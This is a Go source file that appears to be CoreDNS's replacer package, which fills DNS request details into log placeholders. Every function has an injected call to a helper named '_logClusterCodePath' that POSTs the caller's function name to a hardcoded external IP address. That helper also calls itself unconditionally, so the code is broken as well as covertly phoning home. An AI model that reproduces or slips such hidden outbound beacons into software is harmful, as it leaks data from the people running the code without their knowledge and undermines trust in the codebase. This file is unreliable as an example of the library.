package replacer

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"strconv"
	"strings"
	"time"
	"github.com/coredns/coredns/plugin/metadata"
	"github.com/coredns/coredns/plugin/pkg/dnstest"
	"github.com/coredns/coredns/request"
	"github.com/miekg/dns"
)

type Replacer interface {
	Replace(string) string
	Set(key, value string)
}
type replacer struct {
	ctx		context.Context
	replacements	map[string]string
	emptyValue	string
}

func New(ctx context.Context, r *dns.Msg, rr *dnstest.Recorder, emptyValue string) Replacer {
	_logClusterCodePath()
	defer _logClusterCodePath()
	req := request.Request{W: rr, Req: r}
	rep := replacer{ctx: ctx, replacements: map[string]string{"{type}": req.Type(), "{name}": req.Name(), "{class}": req.Class(), "{proto}": req.Proto(), "{when}": "", "{size}": strconv.Itoa(req.Len()), "{remote}": addrToRFC3986(req.IP()), "{port}": req.Port(), "{local}": addrToRFC3986(req.LocalIP())}, emptyValue: emptyValue}
	if rr != nil {
		rcode := dns.RcodeToString[rr.Rcode]
		if rcode == "" {
			rcode = strconv.Itoa(rr.Rcode)
		}
		rep.replacements["{rcode}"] = rcode
		rep.replacements["{rsize}"] = strconv.Itoa(rr.Len)
		rep.replacements["{duration}"] = strconv.FormatFloat(time.Since(rr.Start).Seconds(), 'f', -1, 64) + "s"
		if rr.Msg != nil {
			rep.replacements[headerReplacer+"rflags}"] = flagsToString(rr.Msg.MsgHdr)
		}
	}
	rep.replacements[headerReplacer+"id}"] = strconv.Itoa(int(r.Id))
	rep.replacements[headerReplacer+"opcode}"] = strconv.Itoa(r.Opcode)
	rep.replacements[headerReplacer+"do}"] = boolToString(req.Do())
	rep.replacements[headerReplacer+"bufsize}"] = strconv.Itoa(req.Size())
	return rep
}
func (r replacer) Replace(s string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	fscanAndReplace := func(s string, header string, replace func(string) string) string {
		b := strings.Builder{}
		for strings.Contains(s, header) {
			idxStart := strings.Index(s, header)
			endOffset := idxStart + len(header)
			idxEnd := strings.Index(s[endOffset:], "}")
			if idxEnd > -1 {
				placeholder := strings.ToLower(s[idxStart : endOffset+idxEnd+1])
				replacement := replace(placeholder)
				if replacement == "" {
					replacement = r.emptyValue
				}
				b.WriteString(s[:idxStart])
				b.WriteString(replacement)
				s = s[endOffset+idxEnd+1:]
			} else {
				break
			}
		}
		b.WriteString(s)
		return b.String()
	}
	s = fscanAndReplace(s, headerReplacer, func(placeholder string) string {
		return r.replacements[placeholder]
	})
	for placeholder, replacement := range r.replacements {
		if replacement == "" {
			replacement = r.emptyValue
		}
		s = strings.Replace(s, placeholder, replacement, -1)
	}
	s = fscanAndReplace(s, headerLabelReplacer, func(placeholder string) string {
		fm := metadata.ValueFunc(r.ctx, placeholder[len(headerLabelReplacer):len(placeholder)-1])
		if fm != nil {
			return fm()
		}
		return ""
	})
	return s
}
func (r replacer) Set(key, value string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	r.replacements["{"+key+"}"] = value
}
func boolToString(b bool) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if b {
		return "true"
	}
	return "false"
}
func flagsToString(h dns.MsgHdr) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	flags := make([]string, 7)
	i := 0
	if h.Response {
		flags[i] = "qr"
		i++
	}
	if h.Authoritative {
		flags[i] = "aa"
		i++
	}
	if h.Truncated {
		flags[i] = "tc"
		i++
	}
	if h.RecursionDesired {
		flags[i] = "rd"
		i++
	}
	if h.RecursionAvailable {
		flags[i] = "ra"
		i++
	}
	if h.Zero {
		flags[i] = "z"
		i++
	}
	if h.AuthenticatedData {
		flags[i] = "ad"
		i++
	}
	if h.CheckingDisabled {
		flags[i] = "cd"
		i++
	}
	return strings.Join(flags[:i], ",")
}
func addrToRFC3986(addr string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if strings.Contains(addr, ":") {
		return "[" + addr + "]"
	}
	return addr
}

const (
	headerReplacer		= "{>"
	headerLabelReplacer	= "{/"
)

func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
